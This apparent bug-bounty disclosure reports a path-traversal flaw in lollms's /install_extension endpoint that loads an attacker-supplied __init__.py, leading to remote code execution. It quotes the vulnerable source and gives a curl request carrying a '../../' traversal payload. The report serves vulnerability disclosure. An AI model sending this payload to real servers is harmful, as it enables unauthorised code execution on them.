# Description
LFI exists in `@router.post("/install_extension")`'s `name`, which allows attacker to parse a malicous `name` in to `ExtensionBuilder().build_extension(`

Which cause the server to load `__init__.py` in arbitrary when running `importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))`. Which the path can be pointing to the `upload directory for each dicussions` , causing the server to load arbitrary python file, thus causing RCE.

 # Proof of Concept

```python
@router.post("/install_extension")
def install_extension(data: ExtensionInstallInfos):
    if not data.name:
        try:
            data.name=lollmsElfServer.config.extensions[-1]
        except Exception as ex:
            lollmsElfServer.error(ex)
            return
    try:
        extension_path = lollmsElfServer.lollms_paths.extensions_zoo_path / data.name
        ASCIIColors.info(f"- Reinstalling extension {data.name}...")
        try:
            lollmsElfServer.mounted_extensions.append(ExtensionBuilder().build_extension(extension_path,lollmsElfServer.lollms_paths, lollmsElfServer, InstallOption.FORCE_INSTALL))
            return {"status":True}
        except Exception as ex:
            ASCIIColors.error(f"Extension file not found or is corrupted ({data.name}).\nReturned the following exception:{ex}\nPlease verify that the personality you have selected exists or select another personality. Some updates may lead to change in personality name or category, so check the personality selection in settings to be sure.")
            trace_exception(ex)
            ASCIIColors.info("Trying to force reinstall")
            return {"status":False, 'error':str(e)}

    except Exception as e:
        return {"status":False, 'error':str(e)}
```

As we can see, `data.name` is concat directly with `lollmsElfServer.lollms_paths.extensions_zoo_path` and used as a argument for `ExtensionBuilder().build_extension(`. However, in `ExtensionBuilder()`:

```python
class ExtensionBuilder:
    def build_extension(
                        self, 
                        extension_path:str, 
                        lollms_paths:LollmsPaths,
                        app,
                        installation_option:InstallOption=InstallOption.INSTALL_IF_NECESSARY
                    )->LOLLMSExtension:

        extension, script_path = self.getExtension(extension_path, lollms_paths, app)
        return extension(app = app, installation_option = installation_option)
    
    def getExtension(
                        self, 
                        extension_path:str, 
                        lollms_paths:LollmsPaths,
                        app
                    )->LOLLMSExtension:
        
        extension_path = lollms_paths.extensions_zoo_path / extension_path

        # define the full absolute path to the module
        absolute_path = extension_path.resolve()
        # infer the module name from the file path
        module_name = extension_path.stem
        # use importlib to load the module from the file path
        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))
        extension_module = loader.load_module()
        extension:LOLLMSExtension = getattr(extension_module, extension_module.extension_name)
        return extension, absolute_path
```

s we can see, this part of code firstly defines a class named `ExtensionBuilder` for building and loading external extensions. The `build_extension` method takes an extension path, a `LollmsPaths` instance, an application instance, and an installation option (default is to install when necessary), and returns a configured extension instance. The `getExtension` method is responsible for loading and returning an extension class (`LOLLMSExtension`) and script path, given an extension path and application instance. Specifically, it dynamically loads a module using `importlib` by parsing the extension path and retrieves a specified extension class instance from it.

However, as we see here, the server directly concat `lollms_paths.extensions_zoo_path / extension_path` to generate the `extension_path` and loads `extension_path.resolve() / "__init__.py"` directly via `importlib.machinery.SourceFileLoader`. In which `extension_path` is vulnerable to path traversal. 

if we parse  to `data.name`  a list that contains a path-traversing payload to a location that we can upload `py` files(in this case can be our `upload directory for each dicussions`). The server will consequently loads the `__init__.py` can cause it to execute arbitrary codes `like os.system` and even creating a reverse-shell connection.

# Exploiting

You may reference [This report](https://huntr.com/bounties/3fcc053c-7b41-40f0-a118-b6bfa5019e38/) for uploading the `__init__.py` and knowing the path to it, other than that, you may use

```python
curl -X 'POST' \
  'http://localhost:9600/install_extension' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "../../../../../../../../../../../path/to/discussion_databases/default/<index>/text_data"
}'
```

To load the malicious `__init__.py`
Remote Code Execution. `lollms`can be exposed to external endpoint or the ui when binding to `0.0.0.0` or in `headless mode`. (can be set via official docs [here](https://lollms.com/index.php/news/)) thus no user interactions are required.